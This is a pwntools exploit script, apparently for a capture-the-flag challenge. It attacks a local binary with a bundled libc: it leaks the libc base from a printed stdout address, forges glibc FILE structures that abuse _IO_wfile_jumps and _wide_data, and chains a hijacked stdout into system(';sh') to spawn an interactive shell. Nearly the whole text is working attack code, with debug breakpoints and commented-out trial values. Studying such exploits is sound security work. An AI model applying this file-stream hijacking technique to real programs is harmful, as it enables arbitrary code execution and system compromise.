from pwn import *
from time import sleep
context.arch = 'amd64'

## _IO_new_file_overflow
def debug():
        if local<2:
                gdb.attach(p,'''
                        b* puts
                        b* __GI__IO_flush_all+299
                        c 
                        p _IO_2_1_stdout_
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
nc="nc localhost 1337"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
p.recvuntil("stdout : ")
libc.address=int(p.recvline().strip(),16)-libc.symbols["_IO_2_1_stdout_"]
log.info(hex(libc.address))
#debug()


f=FileStructure(null=libc.address+0x00000000001e7000+0x10)
stdout=libc.symbols["_IO_2_1_stdout_"]
l=0xe0
f.vtable=0x1122334455667788 #libc.symbols["_IO_wfile_jumps"]+0x18-0x38

#f._wide_data=stdout+0xe0-0xe0


stdout=libc.symbols["_IO_2_1_stdout_"]
l=0xe0

f.vtable=libc.symbols["_IO_wfile_jumps"]+0x18-0x18
f._wide_data=stdout+0xe0-0xe0   -0x28-0x20-0x18+0x10+8
f.flags= u64(b"\x04\x04;sh".ljust(8,b"\x00")) #u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
f.fileno=1 # libc.symbols["_IO_2_1_stderr_"]  ## this will go into the chain_ of stdout
f.chain=libc.symbols["_IO_2_1_stdin_"]
f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=stdout+0x82 # 0 #stdout+0x83
f._IO_write_base=0
f._IO_write_ptr=libc.symbols["gets"]  #stdout+0x83+0x100
f._IO_write_end=0 #stdout+0x83
f._IO_buf_base=stdout+0x83
f._IO_buf_end=stdout+0x83+1
f._offset=stdout # looks like this is widedata

# f._codecvt=0x1122334455667788  ### for some reason this results in infinte loop 

payload=bytes(f)
payload=payload[:0x70]+p64(libc.symbols["_IO_2_1_stdout_"]-8)+payload[0x78:]  # this to overwrite _chain
#payload=payload[:0xc8]+p64(0x11223344)+payload[0xc8+8:]  # this for mode

#f._mode=1 # mind this 
pause()
p.send(payload[8:])
pause()

 ################## second stage gets()


f.vtable=libc.symbols["_IO_wfile_jumps"]+0x18-0x38
#f._wide_data=stdout+0xe0-0xe0
f.flags= u64(b"\x04\x04;sh".ljust(8,b"\x00")) #u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
f.fileno=1
#f.chain=libc.symbols["_IO_2_1_stdin_"]
'''f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=stdout+0x82 #stdout+0x83
f._IO_write_base=stdout+0x'''

f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=stdout+0x82 # 0 #stdout+0x83
f._IO_write_base=0
 
f._IO_write_ptr=stdout+0x83+0x100
f._IO_write_end=0 #stdout+0x83
f._IO_buf_base=stdout+0x83
f._IO_buf_end=stdout+0x83+1

f._wide_data=stdout+0xe0-0xe0   -0x28-0x20-0x18+0x10+8-0x20-0x10
f.chain=stdout-8+0xa8
#f._IO_write_base=stdout+0x82
payload=bytes(f)


f=FileStructure(null=libc.address+0x00000000001e7000+0x10)
stdout=stdout-8+0xa8  # libc.symbols["_IO_2_1_stdout_"]
l=0xe0
f.vtable=libc.symbols["_IO_wfile_jumps"]+0x18-0x18
f._wide_data=stdout+0xe0-0xe0
f.flags= u64(b"\x04\x04;sh".ljust(8,b"\x00")) #u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
f.fileno=1
f.chain=libc.symbols["_IO_2_1_stdin_"]
f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=0 #stdout+0x83
f._IO_write_base=0#stdout+0x83
f._IO_write_ptr=stdout+0x83
f._IO_write_end=0 #stdout+0x83
f._IO_buf_base=stdout+0x83
f._IO_buf_end=stdout+0x83+1
payload2=bytes(f)
p.sendline(b"\x04\x04;sh".ljust(8,b"\x00")+payload[8:0xa8]+payload2+p64(stdout+0xe0+8-0x68)+p64(libc.symbols["system"]))

#p.sendline(b"a"*10)
p.interactive()